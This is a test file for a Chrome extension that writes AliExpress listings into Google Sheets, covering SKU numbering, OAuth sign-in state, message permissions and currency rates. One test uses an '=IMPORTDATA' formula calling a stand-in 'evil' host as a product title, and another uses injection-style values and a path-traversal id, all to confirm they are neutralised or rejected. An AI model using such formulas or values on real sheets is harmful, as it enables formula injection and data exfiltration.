const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

// Results made inside the vm context have another Object prototype; plain() copies them across.
const plain = (x) => JSON.parse(JSON.stringify(x));
const read = (file) => fs.readFileSync(path.join(__dirname, "..", file), "utf8");

// Runs background.js against a fake chrome + fetch. `replies` are fetch responses in order.
// `local` seeds chrome.storage.local; `tokens` is what getAuthToken hands out in turn (null = it fails, as it
// does when a prompt would be needed); the last one repeats. `failure` is Chrome's message for a null token.
function setup(sheet, replies, { local = {}, tokens = ["token"], failure = "OAuth2 not granted or revoked." } = {}) {
  const calls = [];
  const removed = [];
  const tokenCalls = [];
  const store = { ...local };
  let listener;
  const chrome = {
    runtime: {
      getURL: (p) => `chrome-extension://abc/${p}`,
      onMessage: { addListener: (fn) => (listener = fn) },
    },
    identity: {
      getAuthToken: (opts, cb) => {
        tokenCalls.push(opts);
        const token = tokens.length > 1 ? tokens.shift() : tokens[0];
        if (token) return cb(token);
        chrome.runtime.lastError = { message: failure };
        cb();
        chrome.runtime.lastError = undefined;
      },
      removeCachedAuthToken: (opts, cb) => (removed.push(opts.token), cb()),
    },
    storage: {
      sync: { get: async () => ({ sheets: [sheet], activeSheetId: sheet.id }) },
      local: {
        get: async (defaults) => ({ ...defaults, ...store }),
        set: async (items) => void Object.assign(store, items),
      },
    },
  };
  const ctx = vm.createContext({
    chrome,
    fetch: async (url, init) => {
      calls.push({ url, body: init?.body && JSON.parse(init.body) });
      const { status = 200, json = {} } = replies.shift();
      return { ok: status < 400, status, json: async () => json };
    },
    encodeURIComponent,
    console,
  });
  ctx.importScripts = (...files) => files.forEach((file) => vm.runInContext(read(file), ctx));
  vm.runInContext(read("background.js"), ctx);
  return {
    appendRow: async (data) => plain(await ctx.appendRow(data)),
    createSheet: async (data) => plain(await ctx.createSheet(data)),
    listener,
    calls,
    removed,
    tokenCalls,
    store,
  };
}

const sheet = { id: "sheet-id-1234567890", name: "Store", sheetTab: "Joe's Items", startRow: 2 };

test("writes below the last keyword, quotes the tab, stores text as text", async () => {
  const { appendRow, calls } = setup(sheet, [
    { json: { valueRanges: [{ values: [["Keywords"], ["ring"], [], ["lamp"]] }] } },
    { json: {} },
  ]);
  const result = await appendRow({
    title: "=IMPORTDATA(\"http://evil\")",
    price: "4.77",
    salePrice: "8.11",
    link: "https://www.aliexpress.com/item/1.html",
  });
  assert.equal(result.success, true);
  assert.equal(result.sku, undefined); // this sheet has no SKU column
  assert.ok(decodeURIComponent(calls[0].url).endsWith("/values:batchGet?ranges='Joe''s Items'!B:B"));

  const body = calls[1].body;
  assert.equal(body.valueInputOption, "RAW");
  const byRange = Object.fromEntries(body.data.map((d) => [d.range, d.values[0][0]]));
  assert.deepEqual(byRange, {
    "'Joe''s Items'!B5": '=IMPORTDATA("http://evil")',
    "'Joe''s Items'!D5": 4.77,
    "'Joe''s Items'!E5": 8.11,
    "'Joe''s Items'!C5": "https://www.aliexpress.com/item/1.html",
  });
});

test("starts at startRow on an empty sheet and skips empty values", async () => {
  const { appendRow, calls } = setup({ ...sheet, startRow: 3 }, [{ json: {} }, { json: {} }]);
  await appendRow({ title: "ring", price: "2", salePrice: "", link: "https://x/1.html" });
  const ranges = calls[1].body.data.map((d) => d.range);
  assert.deepEqual(ranges.sort(), ["'Joe''s Items'!B3", "'Joe''s Items'!C3", "'Joe''s Items'!D3"]);
});

test("retries once with a fresh token on 401", async () => {
  const { appendRow, calls, removed } = setup(sheet, [
    { status: 401 },
    { json: { valueRanges: [] } },
    { json: {} },
  ]);
  const result = await appendRow({ title: "ring", price: "2", salePrice: "", link: "x" });
  assert.equal(result.success, true);
  assert.deepEqual(removed, ["token"]);
  assert.equal(calls.length, 3);
});

test("surfaces the API error message", async () => {
  const { appendRow } = setup(sheet, [
    { status: 400, json: { error: { message: "Unable to parse range: Nope!B:B" } } },
  ]);
  const result = await appendRow({ title: "ring", price: "2", salePrice: "", link: "x" });
  assert.equal(result.success, false);
  assert.equal(result.error, "Unable to parse range: Nope!B:B");
});

test("adds run one at a time so they never pick the same row", async () => {
  const { appendRow, calls } = setup(sheet, [
    { json: { valueRanges: [{ values: [["Keywords"]] }] } },
    { json: {} },
    { json: { valueRanges: [{ values: [["Keywords"], ["ring"]] }] } },
    { json: {} },
  ]);
  const row = { title: "ring", price: "2", salePrice: "", link: "x" };
  await Promise.all([appendRow(row), appendRow(row)]);
  const verbs = calls.map((c) => (c.body ? "write" : "read"));
  assert.deepEqual(verbs, ["read", "write", "read", "write"]);
  assert.ok(calls[1].body.data[0].range.endsWith("2"));
  assert.ok(calls[3].body.data[0].range.endsWith("3"));
});

/* SKU column */

const template = { ...sheet, sheetTab: "Inventory", startRow: 3, skuCol: "A", skuPrefix: "SKU-" };
const product = { title: "ring", price: "2", salePrice: "4", link: "https://x/1.html" };
// What columns A and B hold above the first product on a sheet AliSwift created.
const above = [["eBay FVF Rate:"], ["SKU"]];
const aboveB = [["0.129"], ["Product Name"]];
const ranges = (a, b) => ({ json: { valueRanges: [{ values: a }, { values: b }] } });

test("a sheet with a SKU column gets the next row and the SKU the template formula would show", async () => {
  const { appendRow, calls } = setup(template, [
    ranges([...above, ["SKU-01"], ["SKU-02"]], [...aboveB, ["a"], ["b"]]),
    { json: {} },
  ]);
  const result = await appendRow(product);
  assert.deepEqual(result, { success: true, sku: "SKU-03" });
  assert.ok(decodeURIComponent(calls[0].url).endsWith("ranges='Inventory'!A:A&ranges='Inventory'!B:B"));
  const byRange = Object.fromEntries(calls[1].body.data.map((d) => [d.range, d.values[0][0]]));
  assert.deepEqual(byRange, {
    "'Inventory'!B5": "ring",
    "'Inventory'!D5": 2,
    "'Inventory'!E5": 4,
    "'Inventory'!C5": "https://x/1.html",
    "'Inventory'!A5": "SKU-03",
  });
  assert.equal(calls[1].body.valueInputOption, "RAW");
});

test("the template's empty rows start at the first data row with SKU-01", async () => {
  // Formula cells that show nothing come back as empty strings, or not at all.
  const { appendRow, calls } = setup(template, [ranges([...above, [""], [""]], aboveB), { json: {} }]);
  assert.equal((await appendRow(product)).sku, "SKU-01");
  assert.ok(calls[1].body.data.every((d) => d.range.endsWith("3")));
});

test("when the row's SKU is taken, the highest base number plus one is used", async () => {
  // Rows were sorted: row 6 would be SKU-04 but SKU-04 exists higher up.
  const { appendRow } = setup(template, [
    ranges([...above, ["SKU-30"], ["SKU-17-5"], ["SKU-04"]], [...aboveB, ["a"], ["b"], ["c"]]),
    { json: {} },
  ]);
  assert.equal((await appendRow(product)).sku, "SKU-31");
});

test("two adds at once get consecutive rows and SKUs", async () => {
  const { appendRow, calls } = setup(template, [
    ranges(above, aboveB),
    { json: {} },
    ranges([...above, ["SKU-01"]], [...aboveB, ["ring"]]),
    { json: {} },
  ]);
  const [a, b] = await Promise.all([appendRow(product), appendRow(product)]);
  assert.deepEqual([a.sku, b.sku], ["SKU-01", "SKU-02"]);
  assert.deepEqual(calls.map((c) => (c.body ? "write" : "read")), ["read", "write", "read", "write"]);
  assert.ok(calls[1].body.data.every((d) => d.range.endsWith("3")));
  assert.ok(calls[3].body.data.every((d) => d.range.endsWith("4")));
});

test("a SKU typed by hand on a row with no name still counts as used", async () => {
  const { appendRow, calls } = setup(template, [
    ranges([...above, ["SKU-01"], [], ["MY-SKU"]], [...aboveB, ["a"]]),
    { json: {} },
  ]);
  const result = await appendRow(product);
  assert.ok(calls[1].body.data.every((d) => d.range.endsWith("6")));
  assert.equal(result.sku, "SKU-04");
});

test("a write never targets a row above the last used one", async () => {
  // Product names run to row 40, SKUs to row 30: the new row is below both.
  const names = Array.from({ length: 40 }, (_, i) => [`item ${i}`]);
  const skus = Array.from({ length: 30 }, (_, i) => [`SKU-${i}`]);
  const { appendRow, calls } = setup(template, [ranges(skus, names), { json: {} }]);
  await appendRow(product);
  assert.ok(calls[1].body.data.every((d) => d.range.endsWith("41")));
});

/* createSheet */

const created = {
  spreadsheetId: "new-sheet-id-123456",
  sheets: [11, 22, 33].map((sheetId, i) => ({ properties: { sheetId, title: ["Dashboard", "Inventory", "Orders"][i] } })),
};
const form = { name: "UK store", region: "UK", homeCurrency: "PKR", rate: 374.37 };
const base = "https://sheets.googleapis.com/v4/spreadsheets";

test("createSheet creates the file, then sets it up with one batchUpdate", async () => {
  const { createSheet, calls } = setup(sheet, [{ json: created }, { json: {} }]);
  const result = await createSheet(form);
  assert.equal(result.success, true);
  assert.equal(calls.length, 2);
  assert.equal(calls[0].url, base); // no trailing slash
  assert.equal(calls[0].body.properties.title, "UK store");
  assert.deepEqual(calls[0].body.sheets.map((s) => s.properties.title), ["Dashboard", "Inventory", "Orders"]);
  assert.equal(calls[1].url, `${base}/new-sheet-id-123456:batchUpdate`);
  // Only the ids Google returned appear in the setup requests.
  const used = JSON.stringify(calls[1].body.requests).match(/"sheetId":\d+/g);
  assert.deepEqual([...new Set(used)].sort(), ['"sheetId":11', '"sheetId":22', '"sheetId":33']);
  assert.deepEqual(result.sheet, {
    id: "new-sheet-id-123456",
    name: "UK store",
    sheetTab: "Inventory",
    startRow: 3,
    skuCol: "A",
    keywordsCol: "B",
    linkCol: "C",
    priceCol: "D",
    salePriceCol: "E",
    statusCol: "M",
    imageCol: "O",
    profitCol: "J",
    marginCol: "L",
    skuPrefix: "SKU-",
    oTab: "Orders",
    oRow: 2,
    oCols: { no: "A", sku: "B", date: "D", qty: "E", sell: "F", cost: "G", profit: "H", status: "J", track: "K", notes: "L" },
    region: "UK",
  });
});

test("a failed setup is retried once", async () => {
  const { createSheet, calls } = setup(sheet, [
    { json: created },
    { status: 500, json: { error: { message: "Backend error" } } },
    { json: {} },
  ]);
  const result = await createSheet(form);
  assert.equal(result.success, true);
  assert.equal(calls.length, 3);
  assert.deepEqual(calls[1].body, calls[2].body);
});

test("when setup fails twice the half-built file's id comes back", async () => {
  const { createSheet, calls } = setup(sheet, [
    { json: created },
    { status: 500, json: { error: { message: "Backend error" } } },
    { status: 400, json: { error: { message: "Invalid requests[41]" } } },
  ]);
  const result = await createSheet(form);
  assert.deepEqual(result, { success: false, error: "Invalid requests[41]", orphanId: "new-sheet-id-123456" });
  assert.equal(calls.length, 3);
});

test("resumeId finishes the same file without creating another", async () => {
  const { createSheet, calls } = setup(sheet, [{ json: created }, { json: { range: "Inventory!B3:F1000" } }, { json: {} }]);
  const result = await createSheet({ ...form, resumeId: "new-sheet-id-123456" });
  assert.equal(result.success, true);
  assert.equal(result.sheet.id, "new-sheet-id-123456");
  assert.equal(calls.length, 3);
  assert.ok(calls[0].url.startsWith(`${base}/new-sheet-id-123456?fields=`)); // a read, not a create
  assert.equal(calls[0].body, undefined);
  assert.ok(calls[1].url.startsWith(`${base}/new-sheet-id-123456/values/`)); // a read of the input columns
  assert.equal(calls[2].url, `${base}/new-sheet-id-123456:batchUpdate`);
});

test("resumeId will not run setup over an Inventory tab the owner has started filling in", async () => {
  const { createSheet, calls } = setup(sheet, [
    { json: created },
    { json: { values: [[], ["", "", "", "9.99"]] } }, // a sell price typed on row 4
  ]);
  const result = await createSheet({ ...form, resumeId: "new-sheet-id-123456" });
  assert.equal(result.success, false);
  assert.equal(result.orphanId, "new-sheet-id-123456");
  assert.match(result.error, /already has data/);
  assert.ok(calls.every((c) => !c.url.endsWith(":batchUpdate")), "nothing was written");
});

test("createSheet reports Google's message when the file can't be created", async () => {
  const { createSheet, calls } = setup(sheet, [
    { status: 403, json: { error: { message: "The caller does not have permission" } } },
  ]);
  const result = await createSheet(form);
  assert.equal(result.success, false);
  assert.equal(result.error, "The caller does not have permission");
  assert.equal(result.orphanId, undefined);
  assert.equal(calls.length, 1);
});

test("createSheet refuses bad input before it calls Google", async () => {
  const { createSheet, calls } = setup(sheet, []);
  for (const bad of [{ homeCurrency: 'PKR")' }, { skuPrefix: '"&1' }, { rate: -3 }, { region: "XX" }, { resumeId: "../x" }]) {
    assert.equal((await createSheet({ ...form, ...bad })).success, false);
  }
  assert.equal(calls.length, 0);
});

/* The message router */

const ask = (listener, request, senderUrl) =>
  new Promise((resolve) => {
    if (listener(request, { url: senderUrl }, (r) => resolve(plain(r))) !== true) resolve("not handled");
  });
const page = "https://www.aliexpress.com/item/1.html";
const options = "chrome-extension://abc/options/options.html";

test("createSheet is for AliSwift's own pages only; adding a row also works from a product page", async () => {
  const { listener, calls } = setup(sheet, [{ json: {} }, { json: {} }]);
  assert.deepEqual(await ask(listener, { action: "createSheet", data: form }, page), { success: false, error: "Not allowed." });
  assert.equal(calls.length, 0);
  assert.equal((await ask(listener, { action: "appendToSheet", data: product }, page)).success, true);
  assert.equal(await ask(listener, { action: "nope" }, options), "not handled");
  assert.equal(await ask(listener, { action: "constructor" }, options), "not handled");

  const own = setup(sheet, [{ json: created }, { json: {} }]);
  assert.equal((await ask(own.listener, { action: "createSheet", data: form }, options)).success, true);
});

test("a handler that throws still answers", async () => {
  const { listener } = setup(sheet, []);
  const result = await ask(listener, { action: "createSheet", data: null }, options);
  assert.equal(result.success, false);
  assert.ok(result.error);
});

/* Sign-in state */

const SIGNIN = { success: false, code: "signin", error: "Sign in to Google to use sheets." };

test("a save never opens a sign-in window: every token request is silent", async () => {
  const { appendRow, tokenCalls } = setup(sheet, [{ json: {} }, { json: {} }]);
  assert.equal((await appendRow(product)).success, true);
  assert.deepEqual(plain(tokenCalls), [{ interactive: false }, { interactive: false }]);
});

test("a token Chrome can't give silently means sign in, on the first call and after a 401", async () => {
  const first = setup(sheet, [], { tokens: [null] });
  assert.deepEqual(await first.appendRow(product), SIGNIN);
  assert.equal(first.calls.length, 0);

  const revoked = setup(sheet, [{ status: 401 }], { tokens: ["token", null] });
  assert.deepEqual(await revoked.appendRow(product), SIGNIN);
  assert.deepEqual(revoked.removed, ["token"]);
  assert.ok(revoked.tokenCalls.every((c) => c.interactive === false));
});

test("while the user is signed out here, Chrome is not asked for a token and nothing is written", async () => {
  const { appendRow, calls, tokenCalls } = setup(sheet, [], { local: { authOff: true } });
  assert.deepEqual(await appendRow(product), SIGNIN);
  assert.equal(tokenCalls.length, 0);
  assert.equal(calls.length, 0);
});

test("authState answers from a silent probe and never hands out the token", async () => {
  const on = setup(sheet, []);
  assert.deepEqual(await ask(on.listener, { action: "authState" }, page), { success: true, signedIn: true });
  assert.deepEqual(plain(on.tokenCalls), [{ interactive: false }]);
  assert.deepEqual(await ask(setup(sheet, [], { tokens: [null] }).listener, { action: "authState" }, page), { success: true, signedIn: false });
  const off = setup(sheet, [], { local: { authOff: true } });
  assert.deepEqual(await ask(off.listener, { action: "authState" }, page), { success: true, signedIn: false });
  assert.equal(off.tokenCalls.length, 0);
});

test("a silent token that failed only because Google can't be reached is unknown, never signed out", async () => {
  const net = { tokens: [null], failure: "OAuth2 request failed: Service responded with network error code -106" };
  assert.deepEqual(await ask(setup(sheet, [], net).listener, { action: "authState" }, page), { success: true, signedIn: null });
  const save = setup(sheet, [], net);
  assert.deepEqual(await save.appendRow(product), { success: false, code: "offline", error: "Couldn't reach Google. Check your connection." });
  assert.equal(save.calls.length, 0);
  // Chrome's wording for needing a sign-in still reads as signed out.
  for (const failure of ["The user is not signed in.", "OAuth2 not granted or revoked."]) {
    assert.deepEqual(await ask(setup(sheet, [], { tokens: [null], failure }).listener, { action: "authState" }, page), { success: true, signedIn: false }, failure);
  }
});

test("signIn is the only interactive call, from AliSwift's pages, and clears the signed-out flag once Google answers", async () => {
  const { listener, tokenCalls, store } = setup(sheet, [], { local: { authOff: true } });
  assert.deepEqual(await ask(listener, { action: "signIn" }, page), { success: false, error: "Not allowed." });
  assert.equal(tokenCalls.length, 0);
  assert.deepEqual(await ask(listener, { action: "signIn" }, options), { success: true, signedIn: true });
  assert.deepEqual(plain(tokenCalls), [{ interactive: true }]);
  assert.equal(store.authOff, false);

  const closed = setup(sheet, [], { local: { authOff: true }, tokens: [null] });
  const reply = await ask(closed.listener, { action: "signIn" }, options);
  assert.deepEqual(reply, { success: false, error: "OAuth2 not granted or revoked." });
  assert.equal(closed.store.authOff, true); // a closed window changes nothing
});

test("signOut is local: it sets the flag and drops the cached token, from AliSwift's pages only", async () => {
  const { listener, removed, store, appendRow } = setup(sheet, []);
  assert.deepEqual(await ask(listener, { action: "signOut" }, page), { success: false, error: "Not allowed." });
  assert.equal(store.authOff, undefined);
  assert.deepEqual(await ask(listener, { action: "signOut" }, options), { success: true });
  assert.equal(store.authOff, true);
  assert.deepEqual(removed, ["token"]);
  assert.deepEqual(await appendRow(product), SIGNIN);
});

/* Currency */

const uk = { ...sheet, region: "UK" };
const dashboardCell = (formula, number) => ({
  json: { sheets: [{ data: [{ rowData: [{ values: [{ userEnteredValue: { formulaValue: formula }, effectiveValue: { numberValue: number } }] }] }] }] },
});
const lookup = { sheetId: sheet.id, from: "PKR", to: "GBP" };

test("a save is refused when the prices are in another currency than the sheet's", async () => {
  const wrong = setup(uk, []);
  const result = await wrong.appendRow({ ...product, currency: "PKR" });
  assert.deepEqual(result, { success: false, code: "currency", error: "Prices are in PKR but this sheet is GBP. Nothing was saved." });
  assert.equal(wrong.calls.length, 0);

  // Same currency, or one side unknown: nothing to refuse.
  for (const [s, currency] of [[uk, "GBP"], [uk, ""], [uk, undefined], [sheet, "PKR"]]) {
    assert.equal((await setup(s, [{ json: {} }, { json: {} }]).appendRow({ ...product, currency })).success, true, `${s.region} ${currency}`);
  }
});

test("the rate comes from the cache, then the sheet's own cell, then the one the user typed", async () => {
  const now = Date.now();
  // A fresh cached rate: no request at all.
  const cached = setup(sheet, [], { local: { rates: { "GBP:PKR": { rate: 370, at: now - 60 * 1000 } } } });
  assert.deepEqual(await ask(cached.listener, { action: "rate", data: lookup }, page), { success: true, rate: 370, source: "sheet", at: now - 60 * 1000 });
  assert.equal(cached.calls.length, 0);

  // A stale one: read Dashboard!D2, keep it for next time.
  const stale = { rates: { "GBP:PKR": { rate: 370, at: now - 13 * 3600 * 1000 } } };
  const fresh = setup(sheet, [dashboardCell('=IFERROR(GOOGLEFINANCE("CURRENCY:GBPPKR"),374.37)', 374.5)], { local: stale });
  const found = await ask(fresh.listener, { action: "rate", data: lookup }, page);
  assert.equal(found.rate, 374.5);
  assert.equal(found.source, "sheet");
  assert.match(decodeURIComponent(fresh.calls[0].url), /\/sheet-id-1234567890\?ranges=Dashboard!D2&fields=sheets\.data\.rowData\.values\(userEnteredValue,effectiveValue\)$/);
  assert.equal(fresh.store.rates["GBP:PKR"].rate, 374.5);

  // A number that is not a lookup of this pair is never a rate; the typed rate is next.
  const typed = { rates: { "GBP:PKR:typed": { rate: 360, at: 5 } } };
  for (const reply of [dashboardCell("", 5), dashboardCell('=GOOGLEFINANCE("CURRENCY:GBPUSD")', 1.3), { status: 400, json: {} }]) {
    const miss = setup(sheet, [reply], { local: typed });
    assert.deepEqual(await ask(miss.listener, { action: "rate", data: lookup }, page), { success: true, rate: 360, source: "typed", at: 5 });
  }

  // Signed out, or a sheet that is not one of the user's: no request, typed rate or nothing.
  const out = setup(sheet, [], { local: { ...typed, authOff: true } });
  assert.equal((await ask(out.listener, { action: "rate", data: lookup }, page)).rate, 360);
  const stranger = setup(sheet, []);
  assert.deepEqual(await ask(stranger.listener, { action: "rate", data: { ...lookup, sheetId: "someone-elses-sheet" } }, page), { success: true, rate: null });
  assert.equal(stranger.calls.length, 0);
});

test("the rate lookup refuses a bad pair; setRate is for AliSwift's pages and keeps the rate apart from the cache", async () => {
  const { listener, store } = setup(sheet, []);
  for (const data of [{ ...lookup, from: "pkr" }, { ...lookup, to: "GBPX" }, { ...lookup, to: "PKR" }, undefined]) {
    assert.equal((await ask(listener, { action: "rate", data }, page)).success, false);
  }
  const set = { action: "setRate", data: { from: "PKR", to: "GBP", rate: 374.37 } };
  assert.deepEqual(await ask(listener, set, page), { success: false, error: "Not allowed." });
  assert.equal(store.rates, undefined);
  assert.deepEqual(await ask(listener, set, options), { success: true });
  assert.equal(store.rates["GBP:PKR:typed"].rate, 374.37);
  assert.equal(store.rates["GBP:PKR"], undefined);
  for (const rate of [0, -1, "x", 1e-7, 1e9]) {
    assert.equal((await ask(listener, { ...set, data: { ...set.data, rate } }, options)).success, false, String(rate));
  }
});

test("rates saved at the same moment all survive", async () => {
  const { listener, store } = setup(sheet, []);
  const save = (from, rate) => ask(listener, { action: "setRate", data: { from, to: "GBP", rate } }, options);
  const results = await Promise.all([save("PKR", 374), save("USD", 1.25), save("EUR", 1.15)]);
  assert.ok(results.every((r) => r.success));
  assert.deepEqual(Object.keys(store.rates).sort(), ["GBP:EUR:typed", "GBP:PKR:typed", "GBP:USD:typed"]);
});

/* Your data stays yours */

test("no code the service worker loads can delete rows or clear cells", () => {
  const forbidden = /deleteDimension|deleteRange|deleteSheet|:clear|values:clear|clearBasicFilter/;
  for (const file of ["background.js", "lib/shared.js", "lib/template.js"]) {
    assert.doesNotMatch(read(file), forbidden, file);
  }
});
